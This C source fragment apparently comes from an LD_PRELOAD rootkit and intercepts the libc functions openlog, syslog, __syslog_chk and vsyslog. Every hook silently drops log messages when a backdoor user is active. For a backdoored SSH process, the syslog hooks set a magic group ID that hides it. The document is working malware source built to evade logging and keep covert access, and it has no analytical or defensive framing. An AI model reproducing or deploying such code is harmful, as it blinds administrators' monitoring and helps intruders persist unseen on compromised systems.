void openlog(const char *ident, int option, int facility){
    if(is_bdusr()) return;
    hook(COPENLOG);
    call(COPENLOG, ident, option, facility);
    return;
}

void syslog(int priority, const char *format, ...){
    if(is_bdusr()) return;

    if(bd_sshproc()){
        hook(CSETGID);
        call(CSETGID, MAGIC_GID);
        return;
    }

    va_list va;
    va_start(va, format);
    vsyslog(priority, format, va);
    va_end(va);
    return;
}

void __syslog_chk(int priority, int flag, const char *format, ...){
    if(is_bdusr()) return;

    if(bd_sshproc()){
        hook(CSETGID);
        call(CSETGID, MAGIC_GID);
        return;
    }

    va_list va;
    va_start(va,format);
    vsyslog(priority,format,va);
    va_end(va);
    return;
}

void vsyslog(int priority, const char *format, va_list ap){
    if(is_bdusr()) return;

    if(bd_sshproc()){
        hook(CSETGID);
        call(CSETGID, MAGIC_GID);
        return;
    }

    hook(CVSYSLOG);
    call(CVSYSLOG, priority, format, ap);
    return;
}
